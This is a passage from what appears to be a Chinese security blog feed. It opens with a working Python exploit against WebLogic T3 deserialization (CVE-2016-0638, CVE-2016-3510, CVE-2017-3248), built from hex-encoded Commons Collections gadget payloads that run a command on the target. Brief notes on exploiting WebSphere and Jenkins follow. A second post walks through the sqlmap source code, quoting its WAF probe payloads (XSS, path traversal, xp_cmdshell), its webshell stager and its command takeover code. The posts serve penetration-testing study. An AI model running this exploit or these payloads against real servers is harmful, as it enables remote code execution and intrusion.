nessus#VUL=['CVE-2016-0638','CVE-2016-3510','CVE-2017-3248']PAYLOAD=['aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78','aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870','aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078']VER_SIG=['weblogic.jms.common.StreamMessageImpl','org.apache.commons.collections.functors.InvokerTransformer','\\$Proxy[0-9]+']def t3handshake(sock,server_addr): sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) sock.recv(1024) print 'handshake successful'def buildT3RequestObject(sock,port): data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('&#123;:04x&#125;'.format(dport)) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) print 'send request payload successful,recv length:%d'%(len(sock.recv(2048)))def sendEvilObjData(sock,data): payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('&#123;:08x&#125;'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) res = '' try: while True: res += sock.recv(4096) time.sleep(0.1) except Exception as e: pass return resdef checkVul(res,server_addr,index): p=re.findall(VER_SIG[index], res, re.S) if len(p)&gt;0: print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index]) else: print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index])def run(dip,dport,index): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整 sock.settimeout(50) server_addr = (dip, dport) t3handshake(sock,server_addr) buildT3RequestObject(sock,dport) rs=sendEvilObjData(sock,PAYLOAD[index]) checkVul(rs,server_addr,index)if __name__=="__main__": dip = '10.8.56.17' dport = 7001 for i in range(0,len(VUL)): run(dip,dport,i) WebSphereCVE-2015-4852WebSphere的反序列化漏洞发生的位置在SOAP的通信端口8880，使用的通信协议是https，发送的数据是XML格式的数据。 这个版本的Websphere没进行任何的过滤处理，直接进行了反序列化。 所以只要把恶意代码（和之前jboss的攻击方式一样）base64编码后通过SOAP协议发送至有漏洞的服务器即可命令执行。 JenkinsCVE-2015-8103想要使用这个漏洞利用Java应用，则需要找一个序列化对象的接收入口，并且这个Java应用使用了Commons Collections库。Jenkins是一个开源的持续集成软件。Jenkins启动后会开放多个端口，除了Web控制台之外还有一个CLI端口。CLI端口为随机的高端口，通过jenkins目录下的WEB-INF/jenkins-cli.jar程序可以和CLI端口进行通信。分析通信数据包发现存在base64编码的Java序列化特征值rO0AB。 jenkins-cli.jar在与CLI端口通信之前，会先HTTP GET请求一下jenkins的Web控制台，从响应包中解析出CLI的端口，再做后续通信。 从下图的head头部可以看到随机的序列化对象的接收入口。 X-Jenkins-CLI2-Port是采用SSL加密通信，而如果未解析到X-Jenkins-CLI2-Port头，则会解析X-Jenkins-CLI-Port头，此时Jenkins-CLI通信协议自动降为Version1，并且无SSL加密。 只要将恶意代码序列化后进行base64加密（base64编码后不能有换行），并代替掉之前截到的数据包中的base64字段即可。 由于此漏洞的命令执行结果也是不回显的，上传jar包的方式也只能打印到控制台，依旧不能解决回显问题。如果采用nslookup等方式来检测漏洞也常有漏网之鱼（如果服务器不能主动向外发包）。 总结花了几天时间复现了这些著名的漏洞，颇有收获，稍微了解了各个中间件的一些情况以及的反序列化漏洞的触发方式。 参考文章1参考文章2参考文章3参考文章4参考文章5参考文章6参考文章7参考文章8参考文章9]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>code execution</tag>
        <tag>java unserialize</tag>
        <tag>jboss</tag>
        <tag>weblogic</tag>
        <tag>jenkins</tag>
        <tag>websphere</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap Code Analysis]]></title>
    <url>%2F2017%2F09%2F27%2Fsqlmap-code-analysis%2F</url>
    <content type="text"><![CDATA[概述不得不承认，Sqlmap是目前使用人数最多，功能最复杂的SQL注入工具。作为一款开源工具，开发者有意的让我们自行去阅读并对其进行扩充，从Github可以看出一直在更新的。对于渗透人员来说，阅读sqlmap源码是很有必要的，我们可以从它的源码之中学习到一些优秀的代码编写思维以及方式，应用到平时的渗透中去。 Sqlmap的结构首先看看Sqlmap的目录结构： 目录说明: 123456789101112131415Doc 帮助文档Extra 拓展程序，包含多种额外功能，例如运行cmd、安全执行、shellcode等Lib 类库程序，包含多种连接库，如5种注入类型、提权操作Plugins 插件程序，包括各种数据库的信息以及数据库的通用事项Procs sql语句，包含oracle，postgresql 等的dns_request程序、Mysql的读写文件、mssql的xp_cmdshell等sql语句Shell shell应用，包含多个语言注入成功的shell脚本Tamper 多个绕过程序Thirdparty 第三方程序，如beautifulsoup、优化，保持连接，颜色等等Txt 爆破字典，如浏览器类型、 表，列字典Udf 用户定义的mysql的攻击载荷Waf waf防火墙特征指纹Xml 多种数据库检测载荷以及指纹定义sqlmap.conf 配置文件sqlmap.py 主程序sqlmap.api 接口程序 Sqlmap的流程图如下所示： 概括起来就是当在命令行输入命令的时候，sqlmap首先会进行初始化的操作（版本检测、模块检测、命令行参数解析、Session读取等），之后便会简单的检测是否存在注入点，如果存在注入点便会进行进一步的注入，最后才是接管（takeover）操作。 Sqlmap初始化大部分工具在进行攻击时都会进行初始化，Sqlmap也不例外。为了保证Sqlmap的正常运行首先需要进行python的版本、功能模块的自检。 1234567891011121314151617181920212223# sqlmap.py 开头，这里利用__import__()抛出的异常来检查必要库的存在。try: __import__("lib.utils.versioncheck") # this has to be the first non-standard importexcept ImportError: exit("[!] wrong installation detected (missing modules). Visit 'https://github.com/sqlmapproject/sqlmap/#installation' for further details")``` 下面是import的模块：``` python# /lib/utils/versioncheck.py if PYVERSION &gt;= "3" or PYVERSION &lt; "2.6": exit("[CRITICAL] incompatible Python version detected ('%s'). For successfully running sqlmap you'll have to use version 2.6.x or 2.7.x (visit 'http://www.python.org/download/')" % PYVERSION)extensions = ("gzip", "ssl", "sqlite3", "zlib")try: for _ in extensions: __import__(_)except ImportError: errMsg = "missing one or more core extensions (%s) " % (", ".join("'%s'" % _ for _ in extensions)) errMsg += "most likely because current version of Python has been " errMsg += "built without appropriate dev packages (e.g. 'libsqlite3-dev')" exit(errMsg) 在这之后才进入main()函数,而main()函数的开头便是检查环境（路径、版本）、输出banner信息、读取命令行参数。这里主要关注的是modulePath()函数，为了方便在Windows以及Linux上运行，这里统一将操作系统的编码转化为Unicode编码后返回： 1234567891011121314# sqlmap.pydef main(): checkEnvironment() setPaths(modulePath()) banner() # Store original command line options for possible later restoration cmdLineOptions.update(cmdLineParser().__dict__) nitOptions(cmdLineOptions) ....def modulePath(): ... return getUnicode(os.path.dirname(os.path.realpath(_)), encoding=sys.getfilesystemencoding() or UNICODE_ENCODING) 之后利用python的optionparser模块来对输入的参数进行分析，在此之前，提取出第一个参数前的内容，例python sqlmap.py作为参数传入OptionParser之后就是对参数进行分析了，首先是帮助、版本、log级有关参数。 123456789# /lib/parse/cmdline def cmdLineParser(argv=None): ... try: parser.add_option("--hh", dest="advancedHelp",action="store_true",help="Show advanced help message and exit") parser.add_option("--version", dest="showVersion",action="store_true",help="Show program's version number and exit") parser.add_option("-v", dest="verbose", type="int",help="Verbosity level: 0-6 (default %d)" % defaults.verbose) .... ... 主要显示如下： 接下来便是一个init()函数，千万不要小看这个init()函数，因为它做了很多很多的工作，当然它大部分与你输入的参数有关： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# /lib/core/option.pydef init(): _useWizardInterface() # 引导界面、新手教学 setVerbosity() # 设置输出的详细程度 _saveConfig() # 保存参数到配置文件 _setRequestFromFile() # 读取文件中的http请求 _cleanupOptions() # 清除配置选项 _cleanupEnvironment() # 清除环境变量 _dirtyPatches() # 设置http的最大行数 _purgeOutput() # 文件粉碎 _checkDependencies() # 检查第三方库是否存在，比如mysql、mssql等连接库 _createTemporaryDirectory() # 创建临时目录 _basicOptionValidation() # 检查参数是否有效 _setProxyList() # 设置代理 _setTorProxySettings() # 设置tor代理 _setDNSServer() # 设置dns服务器 _adjustLoggingFormatter() # 调整日志格式 _setMultipleTargets() # 检测多个目标 _setTamperingFunctions() # tamper模块 _setWafFunctions() # waf识别模块 _setTrafficOutputFP() _setupHTTPCollector() _resolveCrossReferences() _checkWebSocket() # 检测websocket parseTargetUrl() # 分析目标检查url，并给config赋值 parseTargetDirect() # 分析目标数据库，并给config赋值 if any((conf.url, conf.logFile, conf.bulkFile, conf.sitemapUrl, conf.requestFile, conf.googleDork, conf.liveTest)): _setHTTPTimeout() _setHTTPExtraHeaders() # 设置http头 _setHTTPCookies() _setHTTPReferer() _setHTTPHost() _setHTTPUserAgent() _setHTTPAuthentication() # 设置http验证方式 _setHTTPHandlers() _setDNSCache() _setSocketPreConnect() # 创建一个预连接的socker connect _setSafeVisit() _doSearch() # 搜索url注入 _setBulkMultipleTargets() # 通过bulkfile读取多个url列表 _setSitemapTargets() # 分析sitemap读取url列表 _checkTor() _setCrawler() # 页面爬取深度 _findPageForms() # 从页面中搜索表单 _setDBMS() # 设置数据库类型 _setTechnique() # 设置注入类型 _setThreads() # 设置线程数 _setOS() _setWriteFile() _setMetasploit() # 设置msf接管功能 _setDBMSAuthentication() loadBoundaries() # 加载boundaries.xml文件 loadPayloads() # 加载payload.xml文件 _setPrefixSuffix() update() # sqlmap自动更新 _loadQueries() # 加载queries.xml文件 在初始化之后，便根据不同的需求运行不同的代码，如下所示：123456789101112131415# sqlmap.py#性能的自测功能，输出是图形文件，可以看出整个程序每个步骤的占用时间百分比、函数调用次数，便于能够直观看出程序运行的瓶颈所在。if conf.profile: profile() # 冒烟测试，简单来说就是对一个软件镜像尽可能的功能覆盖测试。 elif conf.smokeTest: smokeTest()# 从livetests.xml里加载用于测试注入功能的网站和配置样例，进行全面的注入测试。elif conf.liveTest: liveTest()else: try: start() # 真正的开始运行 except thread.error as ex: .... 前三个部分主要是软件的测试，和我们平时渗透没有多大关系，这里便不继续深究下去。 Sqlmap核心数据库直连sqlmap可以通过-d参数来直接连接目标数据库，不过一般需要额外安装第三方模块。 123456# /lib/controller/controller.pyif conf.direct: initTargetEnv() setupTargetEnv() action() return True 读取Session对一个网站进行sql注入测试的时候，sqlmap一般会在当前用户的目录下创建一个.sqlmap目录，里面一般会保存目标网站的一些日志、注入点设置、session信息。session信息一般会以sqllite数据库文件的形式存储，里面主要是id、value两个字段，具体图如下： 它的value值一部分是以明文的形式存储，另一部是AttribDict这个对象序列化后的以base64编码后的形式存储的。 注入标记符接下来是检索注入标记符并给出提示询问是否对标记点检测注入，也就是我们常用的*，来指定注入的位置。 123456789101112131415161718192021222324252627282930313233# /lib/core/target.py if conf.data is not None: conf.method = HTTPMETHOD.POST if not conf.method or conf.method == HTTPMETHOD.GET else conf.method hintNames = [] def process(match, repl): retVal = match.group(0) # 先取出整个字符串 if not (conf.testParameter and match.group("name") not in conf.testParameter): # 如果没有指定注入参数 retVal = repl while True: _ = re.search(r"\\g&lt;([^&gt;]+)&gt;", retVal) if _: retVal = retVal.replace(_.group(0), match.group(int(_.group(1)) if _.group(1).isdigit() else _.group(1))) else: break if kb.customInjectionMark in retVal: # 如果有注入标记符 hintNames.append((retVal.split(kb.customInjectionMark)[0], match.group("name"))) return retVal # 如果data中有注入标记符(这里默认的就是*星号，可以用来指定注入位置) if kb.processUserMarks is None and kb.customInjectionMark in conf.data: message = "custom injection marker ('%s') found in option " % kb.customInjectionMark message += "'--data'. Do you want to process it? [Y/n/q] " choice = readInput(message, default='Y').upper() if choice == 'Q': raise SqlmapUserQuitException else: kb.processUserMarks = choice == 'Y' if kb.processUserMarks: kb.testOnlyCustom = True actionsqlmap 的aciton比较简介，功能也比较清楚，主要就是根据我们的参数来dump相应的数据以及接管的操作,我稍微列举了几个有代表性的功能。 123456789101112131415161718192021222324252627# /lib/controller/action.py def action(): ... # dump if conf.getDbs: conf.dumper.dbs(conf.dbmsHandler.getDbs()) if conf.getTables: conf.dumper.dbTables(conf.dbmsHandler.getTables()) if conf.commonTables: conf.dumper.dbTables(tableExists(paths.COMMON_TABLES)) ... # takeover if conf.osCmd: conf.dbmsHandler.osCmd() if conf.osShell: conf.dbmsHandler.osShell() if conf.regRead: conf.dumper.registerValue(conf.dbmsHandler.regRead()) if conf.regAdd: conf.dbmsHandler.regAdd() .... Waf指纹接下来是加载WAF/IDS/IPS测试函数(可选参数)，conf.identifyWaf对应的是--identify-waf参数，sqlmap能够测试的WAF基本上是很齐全了，都在waf目录中。 从上图中的右边代码可以清楚的看出，主要就是发送几个payload来查看服务器做出的回应。然后根据正则等方式进行waf的指纹匹配. 主要发送的payload我也看一下，由以下四部分组成： 12345678910# /lib/core/settings.pyWAF_ATTACK_VECTORS = ( "", # NIL "search=&lt;script&gt;alert(1)&lt;/script&gt;", "file=../../../../etc/passwd", "q=&lt;invalid&gt;foobar", "id=1 %s" % IDS_WAF_CHECK_PAYLOAD)IDS_WAF_CHECK_PAYLOAD = "AND 1=1 UNION ALL SELECT 1,NULL,'&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#" crawl爬虫sqlmap的爬虫模块主要--crawl这个参数有关，可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。crawl函数在爬虫模块/lib/utils/crawler.py中。代码就不进行列举了，简单的说明下就是Sqlmap会创建一个visited队列和一个value队列，然后进行爬行，先将页面的url通过正则、sitemap之后放入value队列（去重），然后将爬过了url放入visited队列（去重），每次爬行时都会先看看是否已经visited。 接下来是--forms，解析出页面的所有表单的功能实现。调用了/lib/core/common.py中的findPageForms()函数，而对于除了-u方式直接输入目标url的其他输入方式都采用先解析urls，再分别查表的方式 payload(核心)Sqlmap最强大的就是它的注射技术，这也是它最为核心的部分。Sqlmap启动后首先设置测试的level和risk，并识别受测试元素的类型，最终拼凑出相应的漏洞利用方案。这里的payload它主要由boundaries、payloads、queries这几部分组成，且都保存在xml目录下。 boundariesboundaries.xml中保存了注入语句的前缀、后缀，主要就是用来闭合注入点处的前半部分和后半部分。举个例子来说: ?keyword=hello world这里keyword存在注入点，并且是搜索行注入，那么它在服务器端拼接成的语句就是: 1select * from articles where title like '%hello world%'; 所以sqlmap就需要闭合掉前面的引号和后面的引号，就可能会用到boundaries.xml的下列部分： 12345678&lt;boundary&gt; &lt;level&gt;1&lt;/level&gt; &lt;!-- \-\-level 的等级--&gt; &lt;clause&gt;1&lt;/clause&gt; &lt;!-- 从句的类型--&gt; &lt;where&gt;1,2&lt;/where&gt; &lt;!-- 语句注入处, 1 为原始数据后注入，2为随机数后注入--&gt; &lt;ptype&gt;2&lt;/ptype&gt; &lt;prefix&gt;%'&lt;/prefix&gt; &lt;!-- 闭合前半部分--&gt; &lt;suffix&gt; AND '%'='&lt;/suffix&gt; &lt;!-- 闭合后半部分--&gt;&lt;/boundary&gt; 最终会闭合成： 1select * from articles where title like '%hello world%' AND '%'='%'; payloadsxml/payloads 目标下保存着六种注入类型（基于布尔、基于时间、基于错误、union、内联、堆叠）的payload，一般以&lt;test&gt;为结点，&lt;test&gt;具有特定漏洞的全部信息，包括漏洞的level、risk，漏洞类型，利用的方法，检测方法等。主要格式如下： 1（keyword=&apos;%hello world）+prefix（%&apos;）+payloads（AND [RANDNUM]=[RANDNUM]）+comment（#）+suffix（AND (&apos;%&apos;=&apos;） + （ %&apos;） queriesqueries.xml主要就是具体的dump语句了： 12345678910&lt;root&gt; &lt;!-- MySQL --&gt; &lt;dbms value="MySQL"&gt; &lt;!-- .... --&gt; &lt;hostname query="@@HOSTNAME"/&gt; &lt;table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/&gt; &lt;column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/&gt; &lt;is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/&gt; &lt;check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/&gt; &lt;!-- .... --&gt; example在测试一个参数的时候sqlmap会遍历所有符合要求的test节点，会分别发送request与response节点下的payload，然后对服务器响应的数据包进行对比，看其是否存在差异，当确认存在注入的时候，就会以vector来加载queries.xml中的查询语句进行注入。 拿个实际注入的例子来说： TamperSqlmap 的Tamper模块主要就是用来绕waf用的，一般都保存在tamper 目录中，可以依据标准格式自定义，比如把payload用like替换等号，base64编码等…..，tamper都是具有一定的格式的，如果在渗透测试中发现sqlmap自带的tamper不符合，便可以依样画葫芦写个tamper出来： 下面是sqlmap自带的tamper，主要将等号替换成like的tamper： 12345678910111213141516171819202122232425262728# quealtolike.py def dependencies(): singleTimeWarnMessage("tamper script '%s' is unlikely to work against %s" % (os.path.basename(__file__).split(".")[0], DBMS.PGSQL))def tamper(payload, **kwargs): """ Replaces all occurances of operator equal ('=') with operator 'LIKE' Tested against: * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 Notes: * Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') * The LIKE operator is SQL standard. Hence, this tamper script should work against all (?) databases &gt;&gt;&gt; tamper('SELECT * FROM users WHERE id=1') 'SELECT * FROM users WHERE id LIKE 1' """ retVal = payload if payload: retVal = re.sub(r"\s*=\s*", " LIKE ", retVal) return retVal Sqlmap接管接下来是跟提权/后门/系统有关的模块，主要与takeover.py这类型的脚本有关。 下面是osCmd() 函数： 123456789101112131415161718192021def osCmd(self): if isStackingAvailable() or conf.direct: web = False elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL): infoMsg = "going to use a web backdoor for command execution" logger.info(infoMsg) web = True else: errMsg = "unable to execute operating system commands via " errMsg += "the back-end DBMS" raise SqlmapNotVulnerableException(errMsg) self.getRemoteTempPath() # 得到远程临时路径,写入webshell self.initEnv(web=web) if not web or (web and self.webBackdoorUrl is not None): self.runCmd(conf.osCmd) # 执行命令 if not conf.osShell and not conf.osPwn and not conf.cleanup: self.cleanup(web=web) # 清除shell webshellsqlmap自带了一部分的webshell，主要保存在shell目录下，由stager（上传马）、backdoor（执行马），不过这些webshell被压缩过了： php的上传马(stager)： php的执行马(backdoor)： 各位有兴趣的可以改成自己的webshell，压缩的代码如下： 1234567891011data = zlib.decompress(hideAscii(data))def hideAscii(data): retVal = "" for i in xrange(len(data)): if ord(data[i]) &lt; 128: retVal += chr(ord(data[i]) ^ 127) else: retVal += data[i] return retVal Sqlmap其他模块文件粉碎sqlmap自带了文件粉碎功能，可以安全删除文件，且无法恢复。主要由整理硬盘垃圾数据，获取文件句柄，填充垃圾数据，随机命名，最终删除这几个步骤组成。 1234567891011121314151617181920212223242526def purge(directory): ... # 遍历文件 for rootpath, directories, filenames in os.walk(directory): dirpaths.extend([os.path.abspath(os.path.join(rootpath, _)) for _ in directories]) filepaths.extend([os.path.abspath(os.path.join(rootpath, _)) for _ in filenames]) # 修改文件读写属性 for filepath in filepaths: try: os.chmod(filepath, stat.S_IREAD | stat.S_IWRITE) except: pass # 填充垃圾数据 for filepath in filepaths: try: filesize = os.path.getsize(filepath) with open(filepath, "w+b") as f: f.write("".join(chr(random.randint(0, 255)) for _ in xrange(filesize))) except: pass # 截断文件 ... # 重命名文件 ... # 删除文件 ... Sqlmap api如果我们要做二次开发，就可以直接利用这个sqlmap的api，通过进程通信的方式来完成sqlmap的功能,具体请参考这里。 异常汇报在脚本运行中难免会碰到这样那样的错误，sqlmap因此做了很多异常捕获以及处理，如果sqlmap捕获到的异常它无法识别以及处理，便会上传到github上，因此来告知开发者对其进行bug的修复。 1234567891011121314151617181920212223def createGithubIssue(errMsg, excMsg): ...... if choice: ex = None errMsg = errMsg[errMsg.find("\n"):] req = urllib2.Request(url="https://api.github.com/search/issues?q=%s" % urllib.quote("repo:sqlmapproject/sqlmap Unhandled exception (#%s)" % key)) try: content = urllib2.urlopen(req).read() _ = json.loads(content) duplicate = _["total_count"] &gt; 0 closed = duplicate and _["items"][0]["state"] == "closed" if duplicate: warnMsg = "issue seems to be already reported" if closed: warnMsg += " and resolved. Please update to the latest " warnMsg += "development version from official GitHub repository at '%s'" % GIT_PAGE logger.warn(warnMsg) return except: pass 自动更新这部分就不便多展开了，主要就是指sqlmap支持一键升级的功能： 总结这几天大致阅读了Sqlmap的源码，才明白了Sqlmap的强大之处不仅仅在于它的注射功能，更在于它那优秀的代码编码方式、优秀的设计理念、Pythonic 的技巧、各种Python内置模块以及第三方模块的调用等等。也因此学习到了很多新的知识，比如临时文件的粉碎级别删除等等，看了它那优秀的编码后才明白自己平时渗透测试时写的脚本看上去狗爬一般。看来平时还得多抽空看看那些有些的渗透框架、工具，这样才可以尽量避免闭门造车，省去很多很多精力。]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>sqlmap</tag>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android CodeEngn 练习]]></title>
    <url>%2F2017%2F06%2F25%2Fandroid-codeengn%2F</url>
